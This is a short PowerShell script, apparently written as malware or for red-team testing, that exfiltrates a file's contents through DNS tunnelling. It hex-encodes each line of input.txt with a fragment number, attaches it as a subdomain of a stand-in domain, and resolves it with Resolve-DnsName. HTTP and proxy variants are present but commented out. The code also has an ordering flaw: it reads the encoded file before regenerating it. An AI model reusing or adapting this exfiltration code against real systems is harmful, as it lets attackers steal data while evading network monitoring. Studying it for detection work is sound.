$work_dir = "C:\Users\Marck\Documents\Drive\scripts et binaires\Guardian v4\powershell malware\malware"


$raw_content = Get-Content "$work_dir\input.txt"
$encodedFileName = "$work_dir\encoded.txt"

$uri_content = Get-Content $encodedFileName
$uriFileName = "$work_dir\uri.txt"

If (Test-Path $encodedFileName){ Remove-Item $encodedFileName }
If (Test-Path $uriFileName){ Remove-Item $uriFileName }

$domain = "tun.domain.com"
$frag_id = 0
#encoding part

function Convert-StringToHex ($String) {
    return ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-") -join "")
}

foreach ($line in $raw_content)
{
	$to_encode = "$frag_id+$line"
	Convert-StringToHex $to_encode >> $encodedFileName
	$frag_id++
}

#send uri part

foreach ($line in $uri_content)
{
	$uri = "$line.$domain"
	$uri >> $uriFileName
	
	#HTTP method 
	#Invoke-RestMethod -Uri $uri
	
	#HTTP with proxy method 
	#Invoke-RestMethod -Uri $uri -Proxy 'http://10.0.22.62:3128' -TimeoutSec 4
	
	#DNS method
	Resolve-DnsName $uri
	
	Start-Sleep -m 1000
}


